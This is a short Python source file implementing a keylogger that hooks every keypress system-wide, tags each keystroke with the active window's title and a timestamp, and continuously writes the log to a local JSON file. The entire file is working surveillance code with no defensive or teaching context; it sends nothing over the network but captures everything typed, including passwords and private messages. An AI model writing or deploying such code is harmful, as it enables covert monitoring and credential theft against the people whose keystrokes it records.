from datetime import datetime
import keyboard
import pygetwindow as gw
import json


class KeyLoggerService:
    def __init__(self):
        self.dict = {}

    def on_press(self, event):
        window = self._get_window()
        time = self._get_time()

        if len(event.name) > 1:
            if event.name == "space":
                key = " "
            elif event.name == "enter":
                key = "\n"
            else:
                key = f" [{event.name}] "
        else:
            key = event.name

        if window not in self.dict:
            self.dict[window] = {time: key}
        else:
            if time not in self.dict[window]:
                self.dict[window][time] = key
            else:
                self.dict[window][time] += key

        FileWriter.write_to_file(self.dict)

    def _get_window(self):
        window = gw.getActiveWindow()
        return window.title if window else "Unknown Window"

    def _get_time(self):
        return datetime.now().strftime("%d/%m/%y %H:%M")


class FileWriter:
    def __init__(self, file_path='./data.json'):
        self.file_path = file_path

    def write_to_file(self, data_json):
        with open(self.file_path, 'w', encoding="utf-8") as my_data_json:
            json.dump(data_json, my_data_json, indent=4, ensure_ascii=False)


FileWriter = FileWriter()
KeyLoggerService = KeyLoggerService()

keyboard.on_press(KeyLoggerService.on_press)
keyboard.wait()

